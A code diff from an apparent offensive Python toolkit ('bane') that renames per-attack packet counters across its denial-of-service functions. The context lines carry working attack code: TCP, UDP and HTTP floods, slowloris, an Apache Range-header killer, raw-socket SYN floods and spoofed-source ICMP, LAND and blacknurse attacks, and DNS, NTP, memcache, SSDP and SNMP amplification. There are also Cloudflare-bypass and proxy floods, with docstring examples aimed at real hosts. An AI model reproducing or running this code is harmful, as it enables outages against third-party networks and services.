@@ -81,6 +81,8 @@ def udp(u,port=80,ports=None,level=3,size=3,connection=True,interval=300,limitin
    >>>bane.udp(ip,ports=[21,50,80],level=2)
    
   '''
+  global udp_counter
+  udp_counter=0
   global rate1
   global rate2
   global counter
@@ -113,11 +115,11 @@ def udp(u,port=80,ports=None,level=3,size=3,connection=True,interval=300,limitin
     if len(msg)>1400:
        msg=msg[0:1400]
     s.sendto((msg.encode('utf-8')),(u,p))
-    counter+=1
+    udp_counter+=1
     rate1+=1
     rate2+=len(msg)
     if((logs==True) and (int(time.time()-tm)==1)):
-     sys.stdout.write("\rStats=> Packets sent: {} | Rate: {} packets/s  {} bytes/s".format(counter,rate1,rate2))
+     sys.stdout.write("\rStats=> Packets sent: {} | Rate: {} packets/s  {} bytes/s".format(udp_counter,rate1,rate2))
      sys.stdout.flush()
      tm=time.time()
      rate1=0
@@ -133,10 +135,10 @@ def udp(u,port=80,ports=None,level=3,size=3,connection=True,interval=300,limitin
      pass
   print('')
   if returning==True:
-   return packets
+   return udp_counter
 class tcflood(threading.Thread):
  def run(self):
-  global counter
+  global tcp_counter
   global stop
   self.target=target
   self.port=port
@@ -168,9 +170,9 @@ class tcflood(threading.Thread):
       if stop==True:
         break
       s.send(m.encode('utf-8'))
-      counter+=1
+      tcp_counter+=1
       if prints==True:
-       print("[!]Packets: {} | Bytes: {}".format(counter,len(m)))
+       print("[!]Packets: {} | Bytes: {}".format(tcp_counter,len(m)))
      except Exception as dx:
       break
      time.sleep(self.speed)
@@ -190,6 +192,8 @@ class tcflood(threading.Thread):
   maxtime: (set by default to: 5) timeout flag
 '''
 def tcpflood(u,p=80,threads=256,maxtime=5,ampli=10,roundmin=5,roundmax=15,level=1,interval=300,logs=True,returning=False,settor=False):
+ global tcp_counter
+ tcp_counter=0
  global tor
  tor=settor
  global stop
@@ -239,10 +243,10 @@ def tcpflood(u,p=80,threads=256,maxtime=5,ampli=10,roundmin=5,roundmax=15,level=
    stop=True
    break
  if returning==True:
-  return counter
+  return tcp_counter
 class htflood(threading.Thread):
  def run(self):
-  global counter
+  global http_counter
   self.target=target
   self.port=port
   self.timeout=timeout
@@ -312,9 +316,9 @@ class htflood(threading.Thread):
       if stop==True:
         break
       s.send(m.encode('utf-8'))
-      counter+=1
+      http_counter+=1
       if prints==True:
-       print("[!]Request: {} | Type: {} | Bytes: {}".format(counter,req,len(m)))
+       print("[!]Request: {} | Type: {} | Bytes: {}".format(http_counter,req,len(m)))
      except:
       break
      time.sleep(self.speed)
@@ -353,6 +357,8 @@ def httpflood(u,p=80,threads=256,maxtime=5,ampli=1,roundmin=5,roundmax=15,level=
    >>>bane.httpflood('www.google.com',p=80,threads=500,maxtime=7)
 
 '''
+ global http_counter
+ http_counter=0
  global tor
  tor=settor
  global stop
@@ -403,10 +409,10 @@ def httpflood(u,p=80,threads=256,maxtime=5,ampli=1,roundmin=5,roundmax=15,level=
    stop=True
    break
  if returning==True:
-  return counter
+  return http_counter
 class prflood(threading.Thread):
  def run(self):
-  global counter
+  global lulzer_counter
   self.target=target
   self.port=port
   self.timeout=timeout
@@ -485,9 +491,9 @@ class prflood(threading.Thread):
       if stop==True:
         break
       s.send(m.encode('utf-8'))
-      counter+=1
+      lulzer_counter+=1
       if prints==True:
-       print("[!]Bot: {} | Request: {} | Type: {} | Bytes: {}".format(ipp,counter,req,len(m)))
+       print("[!]Bot: {} | Request: {} | Type: {} | Bytes: {}".format(ipp,lulzer_counter,req,len(m)))
      except:
       break
      time.sleep(self.speed)
@@ -514,6 +520,8 @@ def lulzer(u,p=80,threads=100,maxtime=7,httpl=None,socks4l=None,socks5l=None,amp
    >>>bane.lulzer('www.google.com',p=80,threads=500)
 
 '''
+ global lulzer_counter
+ lulzer_counter=0
  global stop
  stop=False
  global prints
@@ -576,7 +584,7 @@ def lulzer(u,p=80,threads=100,maxtime=7,httpl=None,socks4l=None,socks5l=None,amp
    stop=True
    break
  if returning==True:
-  return counter
+  return lulzer_counter
 class reqpost(threading.Thread):
  def run(self):
   self.target=target
@@ -704,12 +712,11 @@ class pham(threading.Thread):
       if prints==True:
        print("Posted: {} --> {}".format(h,ipp))
       time.sleep(random.uniform(.1,3))
-     except Exception as e:
-      print e
+     except:
       break
     s.close()
-   except Exception as ex:
-    print ex
+   except:
+    pass
    time.sleep(.1)
    if stop==True:
     break
@@ -1047,7 +1054,7 @@ def slowread(u,p=80,threads=500,maxtime=5,speed1=3,speed2=5,read1=1,read2=3,logs
    break
 class apa(threading.Thread):
  def run(self):
-  global counter
+  global apache_killer_counter
   self.target=target
   self.port=port
   self.timeout=timeout
@@ -1074,9 +1081,9 @@ class apa(threading.Thread):
       break
      try:
       s.send("GET {} HTTP/1.1\r\nHost: {}\r\nRange: bytes=0-,{}\r\nUser-Agent: {}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nReferer: {}\r\n\r\n".format("/?"+str(random.randint(1,1000000))+str(random.randint(1,1000000)),self.target,apache,random.choice(ua),random.randint(100,1000),(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis))).encode('utf-8'))
-      counter+=1
+      apache_killer_counter+=1
       if prints==True:
-       print("Requests sent: {}".format(counter))
+       print("Requests sent: {}".format(apache_killer_counter))
      except:
       break
      time.sleep(self.speed)
@@ -1084,7 +1091,7 @@ class apa(threading.Thread):
     pass
 class ptc(threading.Thread):
  def run(self):
-  global counter
+  global proxslow_counter
   self.target=target
   self.port=port
   self.timeout=timeout
@@ -1140,6 +1147,8 @@ class ptc(threading.Thread):
    except Exception as e:
     pass
 def proxslow(u,p=80,threads=500,maxtime=5,ampli=1,speed1=3,speed2=5,read1=1,read2=3,httpl=None,socks4l=None,socks5l=None,interval=300,logs=True,returning=False,settor=False):
+ global proxslow_counter
+ proxslow_counter=0
  global httplist
  if httpl:
   httplist=httpl
@@ -1197,7 +1206,7 @@ def proxslow(u,p=80,threads=500,maxtime=5,ampli=1,speed1=3,speed2=5,read1=1,read
    stop=True
    break
  if returning==True:
-  return counter
+  return proxslow_counter
 def apache_killer(u,p=80,threads=256,maxtime=5,roundmin=5,roundmax=15,level=1,interval=300,logs=True,returning=False,settor=False):
  '''
    this is a python version of the apache killer tool which was originally written in perl.
@@ -1215,6 +1224,8 @@ def apache_killer(u,p=80,threads=256,maxtime=5,roundmin=5,roundmax=15,level=1,in
    >>>bane.apache_killer('www.google.com',p=80)
 
 '''
+ global apache_killer_counter
+ apache_killer_counter=0
  global tor
  tor=settor
  global stop
@@ -1257,10 +1268,10 @@ def apache_killer(u,p=80,threads=256,maxtime=5,roundmin=5,roundmax=15,level=1,in
    stop=True
    break
  if returning==True:
-  return counter
+  return apache_killer_counter
 class loris(threading.Thread):
  def run(self):
-  global counter
+  global slowloris_counter
   self.target=target
   self.port=port
   self.timeout=timeout
@@ -1296,7 +1307,7 @@ class loris(threading.Thread):
     s.send("Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))
     s.send("Connection: keep-alive\r\n".encode("utf-8"))
     ls.append(s)
-    counter+=1
+    slowloris_counter+=1
    except Exception as e:
     pass
    for so in list(ls):
@@ -1304,13 +1315,13 @@ class loris(threading.Thread):
      so.send("X-a: {}\r\n".format(random.randint(1, 1000000)).encode("utf-8"))
     except socket.error as e:
      ls.remove(so)
-     counter=counter-1
-     if counter<0:
-      counter=0
+     slowloris_counter=slowloris_counter-1
+     if slowloris_counter<0:
+      slowloris_counter=0
    if stop==True:
     break
    if prints==True:
-    sys.stdout.write("\r\tSockets alive: {}".format(counter))
+    sys.stdout.write("\r\tSockets alive: {}".format(slowloris_counter))
     sys.stdout.flush()
   for soc in ls:
     try:
@@ -1331,6 +1342,8 @@ def slowloris(u,p=80,threads=20,maxtime=5,interval=300,logs=True,settor=False):
    maxtime: (set by default to: 5) connection timeout flag 
 
 '''
+ global slowloris_counter
+ slowloris_counter=0
  global tor
  tor=settor
  global stop
@@ -1362,7 +1375,7 @@ def slowloris(u,p=80,threads=20,maxtime=5,interval=300,logs=True,settor=False):
  print('')
 class plor(threading.Thread):
  def run(self):
-  global counter
+  #global proxloris_counter
   self.target=target
   self.port=port
   self.timeout=timeout
@@ -1469,7 +1482,7 @@ def proxloris(u,p=80,threads=700,maxtime=5,httpl=None,socks4l=None,socks5l=None,
    break
 class phu(threading.Thread):
  def run(self):
-  global counter
+  global proxhulk_counter
   self.target=target
   self.timeout=timeout
   global httplist
@@ -1496,14 +1509,14 @@ class phu(threading.Thread):
     urllib2.urlopen("http://"+self.target+u,timeout=self.timeout)
     if stop==True:
         break
-    counter+=1
+    proxhulk_counter+=1
     if prints==True:
-     print("[!]Requests: {} | Bot: {}".format(counter,pr.split(':')[0]))
+     print("[!]Requests: {} | Bot: {}".format(proxhulk_counter,pr.split(':')[0]))
    except Exception as e:
     pass
 class hu(threading.Thread):
  def run(self):
-  global counter
+  global hulk_counter
   self.target=target
   self.timeout=timeout
   global stop
@@ -1539,15 +1552,15 @@ class hu(threading.Thread):
       urllib2.urlopen(request,timeout=self.timeout)     
       if stop==True:
         break
-      counter+=1
+      hulk_counter+=1
       if prints==True:
-       print("Requests: {}".format(counter))
+       print("Requests: {}".format(hulk_counter))
      except urllib2.HTTPError as ex:
       if stop==True:
         break
-      counter+=1
+      hulk_counter+=1
       if prints==True:
-       print("Requests: {}".format(counter))
+       print("Requests: {}".format(hulk_counter))
      except Exception as e:
       pass
 def hulk(u,threads=700,maxtime=10,interval=300,logs=True,returning=False,settor=False):
@@ -1566,6 +1579,8 @@ def hulk(u,threads=700,maxtime=10,interval=300,logs=True,returning=False,settor=
    >>>bane.hulk('www.google.com',threads=1000)
 
 '''
+ global hulk_counter
+ hulk_counter=0
  if settor==True:
   socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1', 9050)
   socket.socket = socks.socksocket
@@ -1593,7 +1608,7 @@ def hulk(u,threads=700,maxtime=10,interval=300,logs=True,returning=False,settor=
    stop=True
    break
  if returning==True:
-  return counter
+  return hulk_counter
 def proxhulk(u,threads=700,httpl=None,maxtime=10,interval=300,logs=True,returning=False):
  '''
 
@@ -1612,6 +1627,8 @@ def proxhulk(u,threads=700,httpl=None,maxtime=10,interval=300,logs=True,returnin
    >>>bane.proxhulk('www.google.com')
 
 '''
+ global proxhulk_counter
+ proxhulk_counter=0
  global stop
  stop=False
  global prints
@@ -1641,7 +1658,7 @@ def proxhulk(u,threads=700,httpl=None,maxtime=10,interval=300,logs=True,returnin
    stop=True
    break
  if returning==True:
-  return counter
+  return proxhulk_counter
 def checksum(msg):
  '''
    this function is used for the SYN flood checksum.
@@ -1663,7 +1680,7 @@ def checksum(msg):
  return s
 class sflood(threading.Thread): 
  def run(self):
-  global counter
+  global synflood_counter
   dip=target
   self.target=target
   self.port=port
@@ -1764,9 +1781,9 @@ class sflood(threading.Thread):
     tcp_header = pack('!HHLLBBH',sp, port, 0, ackf, (5 << 4) + 0 , tf, socket.htons (windf))+pack('H',tk)+pack('!H',0)
     packet = iph + tcp_header + urd
     s.sendto(packet, (dip,self.port))
-    counter+=1
+    synflood_counter+=1
     if prints==True:
-     print("[!]Packets: {} | IP: {} | Type: {} | Bytes: {}".format(counter,sip,req,leng))
+     print("[!]Packets: {} | IP: {} | Type: {} | Bytes: {}".format(synflood_counter,sip,req,leng))
    except Exception as e:
     pass
    time.sleep(.1)
@@ -1796,6 +1813,8 @@ def synflood(u,p=80,source_port=-1,max_port=65535,min_port=1024,ip_range=None,ma
    >>>bane.synflood('8.8.8.8',syn=0,ack=1)
 
 '''
+  global synflood_counter
+  synflood_counter=0
   global stop
   stop=False
   global s_port
@@ -1873,10 +1892,10 @@ def synflood(u,p=80,source_port=-1,max_port=65535,min_port=1024,ip_range=None,ma
      stop=True
      break
    if returning==True:
-    return counter  
+    return synflood_counter  
 class udpsp(threading.Thread):
  def run(self):
-  global counter
+  global udpstorm_counter
   self.target=target
   self.port=port
   self.maxttl=maxttl
@@ -1907,9 +1926,9 @@ class udpsp(threading.Thread):
     s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
     packet=bytes(packet)
     s.sendto(packet,(self.target,self.port))
-    counter+=1
+    udpstorm_counter+=1
     if prints==True:
-     print("[!]Packets: {} | IP: {} | Type: UDP | Bytes: {}".format(counter,sip,len(packet)))
+     print("[!]Packets: {} | IP: {} | Type: UDP | Bytes: {}".format(udpstorm_counter,sip,len(packet)))
     time.sleep(.1)
    except:
     pass
@@ -1917,6 +1936,8 @@ def udpstorm(u,p=80,ip_range=None,source_port=-1,max_port=65535,min_port=1024,th
  '''
    this function is for UDP flood attack using spoofed sources
 '''
+ global udpstorm_counter
+ udpstorm_counter=0
  global stop
  stop=False
  global s_port
@@ -1965,10 +1986,10 @@ def udpstorm(u,p=80,ip_range=None,source_port=-1,max_port=65535,min_port=1024,th
     stop=True
     break
   if returning==True:
-    return counter
+    return udpstorm_counter
 class ln(threading.Thread):
  def run(self):
-  global counter
+  global land_counter
   self.target=target
   self.port=port
   self.maxttl=maxttl
@@ -2035,9 +2056,9 @@ class ln(threading.Thread):
     s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
     packet=bytes(packet)
     s.sendto(packet,(self.target,self.port))
-    counter+=1
+    land_counter+=1
     if prints==True:
-     print("[!]Packets: {} | Type: {} | Bytes: {}".format(counter,req,len(urd)))
+     print("[!]Packets: {} | Type: {} | Bytes: {}".format(land_counter,req,len(urd)))
     time.sleep(.1)
    except Exception as e:
     pass
@@ -2045,6 +2066,8 @@ def land(u,p=80,threads=100,max_window=255,min_window=1,low=64,maxi=64,ampli=15,
  '''
    this function is for LAND attack in which we are spoofing the victim's IP and targeted port.
 '''
+ global land_counter
+ land_counter=0
  global stop
  stop=False
  global max_win
@@ -2101,10 +2124,10 @@ def land(u,p=80,threads=100,max_window=255,min_window=1,low=64,maxi=64,ampli=15,
     stop=True
     break
   if returning==True:
-    return counter 
+    return land_counter
 class dampli(threading.Thread):
  def run(self):
-  global counter
+  global dnsamplif_counter
   self.target=target
   self.port=port
   self.query=query
@@ -2117,9 +2140,9 @@ class dampli(threading.Thread):
     s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
     packet=bytes(packet)
     s.sendto(packet,(ip,53))
-    counter+=1
+    dnsamplif_counter+=1
     if prints==True:
-     print ("[!]Packets sent: {} | IP: {}".format(counter,ip))
+     print ("[!]Packets sent: {} | IP: {}".format(dnsamplif_counter,ip))
    except Exception as e:
     pass
     time.sleep(.1)
@@ -2140,6 +2163,8 @@ def dnsamplif(u,p=80,dnslist=[],threads=100,q='ANY',interval=300,logs=True,retur
    >>>bane.dnsamplif('8.8.8.8',dnslist=a)
 
 '''
+ global dnsamplif_counter
+ dnsamplif_counter=0
  global stop
  stop=False
  global prints
@@ -2176,10 +2201,10 @@ def dnsamplif(u,p=80,dnslist=[],threads=100,q='ANY',interval=300,logs=True,retur
     stop=True
     break
   if returning==True:
-    return counter 
+    return dnsamplif_counter
 class nampli(threading.Thread):
  def run(self):
-  global counter
+  global ntpamplif_counter
   self.target=target
   self.port=port
   time.sleep(2)
@@ -2191,9 +2216,9 @@ class nampli(threading.Thread):
     s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
     packet=bytes(packet)
     s.sendto(packet,(ip,123))
-    counter+=1
+    ntpamplif_counter+=1
     if prints==True:
-     print ("[!]Packets sent: {} | IP: {}".format(counter,ip))
+     print ("[!]Packets sent: {} | IP: {}".format(ntpamplif_counter,ip))
    except Exception as e:
     pass
    time.sleep(.1)
@@ -2213,6 +2238,8 @@ def ntpamplif(u,p=80,ntplist=[],threads=100,interval=300,logs=True,returning=Fal
    >>>bane.ntpamplif('8.8.8.8',ntplist=a)
 
 '''
+ global ntpamplif_counter
+ ntpamplif_counter=0
  global stop
  stop=False
  global prints
@@ -2245,10 +2272,10 @@ def ntpamplif(u,p=80,ntplist=[],threads=100,interval=300,logs=True,returning=Fal
     stop=True
     break
   if returning==True:
-    return counter
+    return ntpamplif_counter
 class memampli(threading.Thread):
  def run(self):
-  global counter
+  global memcacheamplif_counter
   self.target=target
   self.port=port
   time.sleep(2)
@@ -2260,9 +2287,9 @@ class memampli(threading.Thread):
     s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
     packet=bytes(packet)
     s.sendto(packet,(ip,11211))
-    counter+=1
+    memcacheamplif_counter+=1
     if prints==True:
-     print ("[!]Packets sent: {} | IP: {}".format(counter,ip))
+     print ("[!]Packets sent: {} | IP: {}".format(memcacheamplif_counter,ip))
    except Exception as e:
     pass
    time.sleep(.1)
@@ -2282,6 +2309,8 @@ def memcacheamplif(u,p=80,memlist=[],threads=100,interval=300,logs=True,returnin
    >>>bane.memcacheamplif('8.8.8.8',memlist=a)
 
 '''
+ global memcacheamplif_counter
+ memcacheamplif_counter=0
  global stop
  stop=False
  global prints
@@ -2314,10 +2343,10 @@ def memcacheamplif(u,p=80,memlist=[],threads=100,interval=300,logs=True,returnin
     stop=True
     break
   if returning==True:
-    return counter
+    return memcacheamplif_counter
 class charampli(threading.Thread):
  def run(self):
-  global counter
+  global chargenamplif_counter
   self.target=target
   self.port=port
   time.sleep(2)
@@ -2329,9 +2358,9 @@ class charampli(threading.Thread):
     s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
     packet=bytes(packet)
     s.sendto(packet,(ip,19))
-    counter+=1
+    chargenamplif_counter+=1
     if prints==True:
-     print ("[!]Packets sent: {} | IP: {}".format(counter,ip))
+     print ("[!]Packets sent: {} | IP: {}".format(chargenamplif_counter,ip))
    except Exception as e:
     pass
    time.sleep(.1)
@@ -2351,6 +2380,8 @@ def chargenamplif(u,p=80,chargenlist=[],threads=100,interval=300,logs=True,retur
    >>>bane.chargenamplif('8.8.8.8',ntplist=a)
 
 '''
+ global chargenamplif_counter
+ chargenamplif_counter=0
  global stop
  stop=False
  global prints
@@ -2383,10 +2414,10 @@ def chargenamplif(u,p=80,chargenlist=[],threads=100,interval=300,logs=True,retur
     stop=True
     break
   if returning==True:
-    return counter
+    return chargenamplif_counter
 class ssampli(threading.Thread):
  def run(self):
-  global counter
+  global ssdpamplif_counter
   self.target=target
   self.port=port
   time.sleep(2)
@@ -2398,9 +2429,9 @@ class ssampli(threading.Thread):
     s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
     packet=bytes(packet)
     s.sendto(packet,(ip,1900))
-    counter+=1
+    ssdpamplif_counter+=1
     if prints==True:
-     print ("[!]Packets sent: {} | IP: {}".format(counter,ip))
+     print ("[!]Packets sent: {} | IP: {}".format(ssdpamplif_counter,ip))
    except Exception as e:
     pass
    time.sleep(.1)
@@ -2420,6 +2451,8 @@ def ssdpamplif(u,p=80,ssdplist=[],threads=100,interval=300,logs=True,returning=F
    >>>bane.ssdpamplif('8.8.8.8',ntplist=a)
 
 '''
+ global ssdpamplif_counter
+ ssdpamplif_counter=0
  global stop
  stop=False
  global prints
@@ -2452,10 +2485,10 @@ def ssdpamplif(u,p=80,ssdplist=[],threads=100,interval=300,logs=True,returning=F
     stop=True
     break
   if returning==True:
-    return counter
+    return ssdpamplif_counter
 class snampli(threading.Thread):
  def run(self):
-  global counter
+  global snmpamplif_counter
   self.target=target
   self.port=port
   time.sleep(2)
@@ -2467,9 +2500,9 @@ class snampli(threading.Thread):
     s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
     packet=bytes(packet)
     s.sendto(packet,(ip,161))
-    counter+=1
+    snmpamplif_counter+=1
     if prints==True:
-     print ("[!]Packets sent: {} | IP: {}".format(counter,ip))
+     print ("[!]Packets sent: {} | IP: {}".format(snmpamplif_counter,ip))
    except Exception as e:
     pass
    time.sleep(.1)
@@ -2489,6 +2522,8 @@ def snmpamplif(u,p=80,snmplist=[],threads=100,interval=300,logs=True,returning=F
    >>>bane.snmpamplif('8.8.8.8',snmplist=a)
 
 '''
+ global snmpamplif_counter
+ snmpamplif_counter=0
  global stop
  stop=False
  global prints
@@ -2521,10 +2556,10 @@ def snmpamplif(u,p=80,snmplist=[],threads=100,interval=300,logs=True,returning=F
     stop=True
     break
   if returning==True:
-    return counter
+    return snmpamplif_counter
 class echst(threading.Thread):
  def run(self):
-  global counter
+  global echo_ref_counter
   self.target=target
   self.port=port
   self.amp=amp
@@ -2542,9 +2577,9 @@ class echst(threading.Thread):
     s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
     packet=bytes(packet)
     s.sendto(packet,(ip,port))
-    counter+=1
+    echo_ref_counter+=1
     if prints==True:
-     print("[!]Packets sent: {} | IP: {} | Bytes: {}".format(counter,ip,len(data)))
+     print("[!]Packets sent: {} | IP: {} | Bytes: {}".format(echo_ref_counter,ip,len(data)))
    except Exception as e:
     pass
    time.sleep(.1)
@@ -2552,6 +2587,8 @@ def echo_ref(u,p=80,pinglist=[],ampli=15,threads=100,interval=300,logs=True,retu
  '''
    this function is for ECHO  reflection attack
 '''
+ global echo_ref_counter
+ echo_ref_counter=0
  global stop
  stop=False
  global prints
@@ -2590,10 +2627,10 @@ def echo_ref(u,p=80,pinglist=[],ampli=15,threads=100,interval=300,logs=True,retu
     stop=True
     break
   if returning==True:
-    return counter
+    return echo_ref_counter
 class icmpcl(threading.Thread):
  def run(self):
-  global counter
+  global icmp_counter
   self.target=target
   self.port=port
   self.minttl=minttl
@@ -2612,9 +2649,9 @@ class icmpcl(threading.Thread):
     s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
     packet=bytes(packet)
     s.sendto(packet,(self.target,self.port))
-    counter+=1
+    icmp_counter+=1
     if prints==True:
-     print("[!]Packets sent: {} | Bytes: {}".format(counter,len(data)))
+     print("[!]Packets sent: {} | Bytes: {}".format(icmp_counter,len(data)))
    except Exception as e:
     pass
    time.sleep(.1)
@@ -2622,6 +2659,8 @@ def icmp(u,p=80,ampli=15,low=64,maxi=64,threads=100,interval=300,logs=True,retur
  '''
    this function is for ICMP flood attack
 '''
+ global icmp_counter
+ icmp_counter=0
  global stop
  stop=False
  global prints
@@ -2662,10 +2701,10 @@ def icmp(u,p=80,ampli=15,low=64,maxi=64,threads=100,interval=300,logs=True,retur
     stop=True
     break
   if returning==True:
-    return counter
+    return icmp_counter
 class icmpst(threading.Thread):
  def run(self):
-  global counter
+  global icmpstorm_counter
   self.target=target
   self.port=port
   self.minttl=minttl
@@ -2689,9 +2728,9 @@ class icmpst(threading.Thread):
     s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
     packet=bytes(packet)
     s.sendto(packet,(self.target,self.port))
-    counter+=1
+    icmpstorm_counter+=1
     if prints==True:
-     print("[!]Packets sent: {} | IP: {} | Bytes: {}".format(counter,sip,len(data)))
+     print("[!]Packets sent: {} | IP: {} | Bytes: {}".format(icmpstorm_counter,sip,len(data)))
    except Exception as e:
     pass
    time.sleep(.1)
@@ -2699,6 +2738,8 @@ def icmpstorm(u,p=80,ip_range=None,ampli=15,low=64,maxi=64,threads=100,interval=
  '''
    this function is for ICMP flood with spoofed sources
 '''
+ global icmpstorm_counter
+ icmpstorm_counter=0
  global stop
  stop=False
  global ip_seg
@@ -2741,10 +2782,10 @@ def icmpstorm(u,p=80,ip_range=None,ampli=15,low=64,maxi=64,threads=100,interval=
     stop=True
     break
   if returning==True:
-    return counter
+    return icmpstorm_counter
 class blnu(threading.Thread):
  def run(self):
-  global counter
+  global blacknurse_counter
   self.target=target
   self.port=port
   self.minttl=minttl
@@ -2762,9 +2803,9 @@ class blnu(threading.Thread):
     s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
     packet=bytes(packet)
     s.sendto(packet,(self.target,self.port))
-    counter+=1
+    blacknurse_counter+=1
     if prints==True:
-     print ("[!]Packets sent: {} | IP: {}".format(counter,sip))
+     print ("[!]Packets sent: {} | IP: {}".format(blacknurse_counter,sip))
    except Exception as e:
     pass
    time.sleep(.1)
@@ -2772,6 +2813,8 @@ def blacknurse(u,p=80,ip_range=None,ampli=15,low=64,maxi=64,threads=100,payloads
  '''
    this function is for "black nurse" attack
 '''
+ global blacknurse_counter
+ blacknurse_counter=0
  global stop
  stop=False
  global ip_seg
@@ -2816,10 +2859,10 @@ def blacknurse(u,p=80,ip_range=None,ampli=15,low=64,maxi=64,threads=100,payloads
     stop=True
     break
   if returning==True:
-    return counter
+    return blacknurse_counter
 class gldn(threading.Thread):
  def run(self):
-  global counter 
+  global goldeneye_counter
   self.target=target
   self.port=port
   self.method=method
@@ -2891,9 +2934,9 @@ class gldn(threading.Thread):
       conn.request("POST", pa, params, headers)
     if stop==True:
         break
-    counter+=1
+    goldeneye_counter+=1
     if prints==True:
-     print("[!]Requests: {} | Type: {}".format(counter,req))
+     print("[!]Requests: {} | Type: {}".format(goldeneye_counter,req))
    except Exception as e:
     pass
    time.sleep(.1)
@@ -2909,6 +2952,8 @@ def goldeneye(u,p=80,threads=700,meth=3,maxtime=5,interval=300,logs=True,returni
    3=>randomly: GET & POST
 
 '''
+ global goldeneye_counter
+ goldeneye_counter=0
  global stop
  stop=False
  global prints
@@ -2937,10 +2982,10 @@ def goldeneye(u,p=80,threads=700,meth=3,maxtime=5,interval=300,logs=True,returni
    stop=True
    break
  if returning==True:
-    return counter
-class dose(threading.Thread):
+    return goldeneye_counter
+class dosecl(threading.Thread):
  def run(self):
-  global counter 
+  global doser_counter
   self.target=target
   u=self.target
   self.timeout=timeout
@@ -3061,15 +3106,15 @@ class dose(threading.Thread):
        requests.post(u, data={k:j}, headers=h,timeout=self.timeout, verify=False)
     if stop==True:
         break
-    counter+=1
+    doser_counter+=1
     if prints==True:
-     print("[!]Requests: {} | Type: {}".format(counter,req))
+     print("[!]Requests: {} | Type: {}".format(doser_counter,req))
    except requests.exceptions.ReadTimeout:
     if stop==True:
         break
-    counter+=1
+    doser_counter+=1
     if prints==True:
-     print("[!]Requests: {} | Type: {}".format(counter,req))
+     print("[!]Requests: {} | Type: {}".format(doser_counter,req))
    except Exception as e:
     pass
    time.sleep(.1)
@@ -3077,6 +3122,8 @@ def doser(u,threads=700,meth=1,maxtime=5,interval=300,logs=True,returning=False,
  '''
   this function is for doser.py attack tool which uses requests module instead of httplib.
 '''
+ global doser_counter
+ doser_counter=0
  global tor
  tor=settor
  global stop
@@ -3090,7 +3137,7 @@ def doser(u,threads=700,meth=1,maxtime=5,interval=300,logs=True,returning=False,
  global timeout
  timeout=maxtime
  for x in range(threads):
-  t=dose()
+  t=dosecl()
   t.start() 
  c=time.time()
  while True:
@@ -3105,10 +3152,10 @@ def doser(u,threads=700,meth=1,maxtime=5,interval=300,logs=True,returning=False,
    stop=True
    break
  if returning==True:
-    return counter
+    return doser_counter
 class pdose(threading.Thread):
  def run(self):
-  global counter 
+  global proxdoser_counter 
   self.target=target
   u=self.target
   self.timeout=timeout
@@ -3180,13 +3227,13 @@ class pdose(threading.Thread):
       requests.post(u, data={k:j}, headers=h,proxies=proxy,timeout=self.timeout, verify=False)
     if stop==True:
         break
-    counter+=1
-    print("[!]Requests: {} | Type: {} | Bot: {}".format(counter,req,pr.split('://')[1].split(':')[0]))
+    proxdoser_counter+=1
+    print("[!]Requests: {} | Type: {} | Bot: {}".format(proxdoser_counter,req,pr.split('://')[1].split(':')[0]))
    except requests.exceptions.ReadTimeout:
     if stop==True:
         break
-    counter+=1
-    print("[!]Requests: {} | Type: {} | Bot: {}".format(counter,req,pr.split('://')[1].split(':')[0]))
+    proxdoser_counter+=1
+    print("[!]Requests: {} | Type: {} | Bot: {}".format(proxdoser_counter,req,pr.split('://')[1].split(':')[0]))
    except Exception as e:
     pass
    time.sleep(.1)
@@ -3194,6 +3241,8 @@ def proxdoser(u,threads=700,httpl=None,meth=1,maxtime=5,interval=300,logs=True,r
  '''
    this is the advanced version of doser.py using http proxies.
 '''
+ global proxdoser_counter
+ proxdoser_counter=0
  global stop
  stop=False
  global prints
@@ -3225,10 +3274,10 @@ def proxdoser(u,threads=700,httpl=None,meth=1,maxtime=5,interval=300,logs=True,r
    stop=True
    break
  if returning==True:
-    return counter
+    return proxdoser_counter
 class atcf(threading.Thread):
  def run(self):
-  global counter
+  global cf_doser_counter
   global stop
   self.target=target
   self.timeout=timeout
@@ -3269,21 +3318,21 @@ class atcf(threading.Thread):
      request.add_header('Host',self.target)
      try:
       req=urllib2.urlopen(request,timeout=self.timeout)            
-      counter+=1
+      cf_doser_counter+=1
       if prints==True:
-       print("Requests: {}".format(counter))
+       print("Requests: {}".format(cf_doser_counter))
      except urllib2.HTTPError as ex:
       if "Too Many Requests" in str(ex):
        stop=True
        break
-      counter+=1
+      cf_doser_counter+=1
       if prints==True:
-       print("Requests: {}".format(counter))
+       print("Requests: {}".format(cf_doser_counter))
      except Exception as e:
       if "The read operation timed out" in str(e):
-       counter+=1
+       cf_doser_counter+=1
        if prints==True:
-        print("Requests: {}".format(counter))
+        print("Requests: {}".format(cf_doser_counter))
 class cooi(threading.Thread):
  def run(self):
   global ier
@@ -3313,6 +3362,8 @@ def cki():
    time.sleep(.1)
  time.sleep(1)
 def cfkill(u,threads=500,maxtime=5,check=True,cook=True,interval=300,logs=True,returning=False):
+ global cf_doser_counter
+ cf_doser_counter=0
  global prints
  global stop
  stop=False
@@ -3361,8 +3412,10 @@ def cfkill(u,threads=500,maxtime=5,check=True,cook=True,interval=300,logs=True,r
    stop=True
    break
  if returning==True:
-    return counter
+    return cf_doser_counter
 def cfkiller(u,threads=500,maxtime=5,interval=300,logs=True,returning=False,wait=10):
+ global cf_doser_counter
